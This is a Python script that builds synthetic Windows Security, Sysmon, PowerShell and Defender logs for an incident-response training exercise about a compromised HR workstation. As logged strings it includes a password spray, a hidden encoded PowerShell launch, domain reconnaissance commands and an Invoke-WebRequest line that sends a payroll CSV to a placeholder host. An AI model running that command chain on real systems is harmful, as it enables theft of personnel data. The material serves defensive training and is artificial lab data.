#!/usr/bin/env python3
"""
make_rdp_lab_data.py — builds the SYNTHETIC evidence set for
GraySentinel DSOU war-room "The Silent RDP Login" (HR-WS-017).

Everything here is declared-synthetic lab data:
  * external IPs are RFC-5737 documentation ranges (203.0.113.0/24, 198.51.100.0/24)
  * domains are example.com / example.net
  * the PowerShell text is a *log string* (what a 4104 event would record), not runnable tooling

Outputs (written next to this script):
  rdp_events_SYNTHETIC.csv    unified Windows Security + Sysmon + PowerShell + Defender events
  auth_context_SYNTHETIC.json identity-provider, VPN, firewall, baseline and change-ticket context
"""
import csv, json, os
from datetime import datetime, timedelta, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
UTC = timezone.utc
FIELDS = ["ts", "host", "channel", "event_id", "user", "logon_type", "logon_id",
          "src_ip", "src_host", "status", "process", "parent", "cmdline",
          "dst_ip", "dst_port", "detail"]

ATTACKER_IP, ATTACKER_HOST = "203.0.113.45", "DESKTOP-9KX2TQ"
VICTIM, VICTIM_IP = "HR-WS-017", "10.20.40.17"
USER = "ananya.rao"
LOGON_ID = "0x3E7A21"


def iso(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def ev(rows, dt, host, channel, eid, **kw):
    r = {k: "" for k in FIELDS}
    r.update(ts=iso(dt), host=host, channel=channel, event_id=str(eid))
    r.update({k: str(v) for k, v in kw.items()})
    rows.append(r)


def build():
    rows = []
    # ---------------- 30-day baseline noise (normal behaviour) ----------------
    day0 = datetime(2026, 9, 5, 4, 0, tzinfo=UTC)          # 09:30 IST
    for d in range(30):
        t = day0 + timedelta(days=d, minutes=(d * 7) % 25)
        if t.weekday() < 5:
            # Ananya: console (2) / unlock (7) / cached (11) only — never RDP
            ev(rows, t, VICTIM, "Security", 4624, user=USER, logon_type=2 if d % 3 else 11,
               logon_id=f"0x1{d:03d}A", src_ip="127.0.0.1", src_host=VICTIM)
        # IT helpdesk legitimately RDPs into HR-WS-009 from the jump host (H2 control case)
        if d % 6 == 0:
            ev(rows, t + timedelta(hours=2), "HR-WS-009", "Security", 4624, user="it.helpdesk",
               logon_type=10, logon_id=f"0x2{d:03d}B", src_ip="10.20.5.25", src_host="JUMP-IT-01",
               detail="CHG-4471")

    # ---------------- Attack window: Mon 05-Oct-2026 03:17 IST (21:47Z Sun) ----------------
    t = datetime(2026, 10, 4, 21, 47, 10, tzinfo=UTC)
    spray = (["administrator"] * 8) + (["hr.admin"] * 6) + ([USER] * 9)
    for i, u in enumerate(spray):
        ev(rows, t + timedelta(seconds=14 * i), VICTIM, "Security", 4625, user=u, logon_type=10,
           src_ip=ATTACKER_IP, src_host=ATTACKER_HOST,
           status="0xC000006A" if u == USER else "0xC0000064")
    t_ok = t + timedelta(seconds=14 * len(spray) + 30)       # 21:53:02Z
    ev(rows, t_ok, VICTIM, "Security", 4624, user=USER, logon_type=10, logon_id=LOGON_ID,
       src_ip=ATTACKER_IP, src_host=ATTACKER_HOST, detail="AuthPkg=Negotiate;NLA=yes")
    ev(rows, t_ok, VICTIM, "Security", 4672, user=USER, logon_id=LOGON_ID,
       detail="SeDebugPrivilege;SeBackupPrivilege;SeTakeOwnershipPrivilege;SeImpersonatePrivilege")
    ev(rows, t_ok + timedelta(seconds=9), VICTIM, "Security", 4688, user=USER, logon_id=LOGON_ID,
       process="rdpclip.exe", parent="svchost.exe", cmdline="rdpclip")

    p = t_ok + timedelta(seconds=89)                         # 21:54:31Z
    ev(rows, p, VICTIM, "Security", 4688, user=USER, logon_id=LOGON_ID,
       process="cmd.exe", parent="explorer.exe", cmdline="cmd.exe")
    enc = "JABzAD0AJwBcAFwARgBTAC0ASABSAC0AMAAxAFwASABSACQAJwA..."   # truncated lab marker
    ps_cmd = f"powershell.exe -NoP -NonI -W Hidden -Enc {enc}"
    for ch, eid in (("Security", 4688), ("Sysmon", 1)):
        ev(rows, p + timedelta(seconds=9), VICTIM, ch, eid, user=USER, logon_id=LOGON_ID,
           process="powershell.exe", parent="cmd.exe", cmdline=ps_cmd)
    block = ("whoami /all; nltest /dclist:corp.example.com; "
             "net group \"Domain Admins\" /domain; "
             "Get-ChildItem \\\\FS-HR-01\\HR$\\Payroll -Recurse -Include *.xlsx | "
             "Export-Csv C:\\Users\\Public\\p.csv; "
             "Invoke-WebRequest -Uri https://cdn-sync.example.net/u -Method Post -InFile C:\\Users\\Public\\p.csv")
    ev(rows, p + timedelta(seconds=10), VICTIM, "PowerShell", 4104, user=USER,
       process="powershell.exe", cmdline=block, detail="ScriptBlock decoded from -Enc")
    for i, (proc, cl) in enumerate([("whoami.exe", "whoami /all"),
                                    ("nltest.exe", "nltest /dclist:corp.example.com"),
                                    ("net.exe", "net group \"Domain Admins\" /domain")]):
        ev(rows, p + timedelta(seconds=14 + 4 * i), VICTIM, "Sysmon", 1, user=USER,
           logon_id=LOGON_ID, process=proc, parent="powershell.exe", cmdline=cl)
    n = p + timedelta(seconds=40)
    for i, (ip, port, note) in enumerate([("10.20.0.10", 389, "DC-01 LDAP"),
                                          ("10.20.30.15", 445, "FS-HR-01 SMB"),
                                          ("198.51.100.23", 443, "cdn-sync.example.net (first seen)")]):
        ev(rows, n + timedelta(seconds=25 * i), VICTIM, "Sysmon", 3, user=USER,
           process="powershell.exe", dst_ip=ip, dst_port=port, detail=note)
    # Internal resource access on the file server (Logon Type 3 from the workstation)
    fs = n + timedelta(seconds=30)
    ev(rows, fs, "FS-HR-01", "Security", 4624, user=USER, logon_type=3, logon_id="0x51C0D2",
       src_ip=VICTIM_IP, src_host=VICTIM)
    ev(rows, fs + timedelta(seconds=2), "FS-HR-01", "Security", 5140, user=USER,
       src_ip=VICTIM_IP, detail="Share=\\\\*\\HR$")
    for i, f in enumerate(["Payroll\\Payroll_Q3_2026.xlsx", "Payroll\\Salary_Revision_FY27.xlsx",
                           "Payroll\\Bank_Mandates_HR.xlsx"]):
        ev(rows, fs + timedelta(seconds=4 + i), "FS-HR-01", "Security", 5145, user=USER,
           src_ip=VICTIM_IP, detail=f"HR$\\{f};Access=ReadData")
    # Same attacker IP sprays other endpoints — all fail
    for host, k, start in (("HR-WS-021", 6, 8), ("FIN-WS-004", 4, 11)):
        for i in range(k):
            ev(rows, t_ok + timedelta(minutes=start, seconds=12 * i), host, "Security", 4625,
               user=USER if i % 2 else "administrator", logon_type=10,
               src_ip=ATTACKER_IP, src_host=ATTACKER_HOST, status="0xC000006A")
    # Defender: scans ran, nothing detected (living-off-the-land)
    ev(rows, t_ok + timedelta(minutes=20), VICTIM, "Defender", 1001, detail="Quick scan finished; 0 threats")
    rows.sort(key=lambda r: r["ts"])
    return rows


CONTEXT = {
    "_note": "SYNTHETIC context for the RDP war-room lab (RFC-5737 / example.com).",
    "users": {
        USER: {"dept": "HR", "title": "HR Business Partner", "home_host": VICTIM,
               "rdp_allowed": False, "local_admin_on": [VICTIM],
               "pwd_last_set": "2026-06-11T05:02:00Z", "mfa": "Entra push (cloud apps only)"},
        "it.helpdesk": {"dept": "IT", "rdp_allowed": True, "approved_sources": ["10.20.5.25"]},
    },
    "idp_signins": [
        {"ts": "2026-10-03T19:11:42Z", "user": USER, "ip": ATTACKER_IP, "app": "Office 365",
         "result": "password OK · MFA denied by user", "asn": "AS64500 hosting (lab)"},
        {"ts": "2026-10-03T19:14:05Z", "user": USER, "ip": ATTACKER_IP, "app": "Office 365",
         "result": "password OK · MFA denied by user", "asn": "AS64500 hosting (lab)"},
    ],
    "vpn_sessions": [
        {"user": USER, "start": "2026-10-05T03:41:00Z", "end": None,
         "client_ip": "198.51.100.140", "isp": "home broadband (lab)"},
    ],
    "firewall": [
        {"rule": "NAT-LEGACY-HR-3389", "public": "203.0.113.200:3389", "to": VICTIM_IP + ":3389",
         "created": "2025-11-02", "owner": "unknown", "note": "temporary vendor access, never removed"},
    ],
    "change_tickets": [{"id": "CHG-4471", "host": "HR-WS-009", "user": "it.helpdesk",
                        "window": "recurring weekly patch"}],
    "edr": {"defender_detections": 0},
}


def main():
    rows = build()
    with open(os.path.join(HERE, "rdp_events_SYNTHETIC.csv"), "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=FIELDS)
        w.writeheader()
        w.writerows(rows)
    with open(os.path.join(HERE, "auth_context_SYNTHETIC.json"), "w") as f:
        json.dump(CONTEXT, f, indent=2)
    print(f"wrote {len(rows)} events -> rdp_events_SYNTHETIC.csv")
    print("wrote context      -> auth_context_SYNTHETIC.json")


if __name__ == "__main__":
    main()
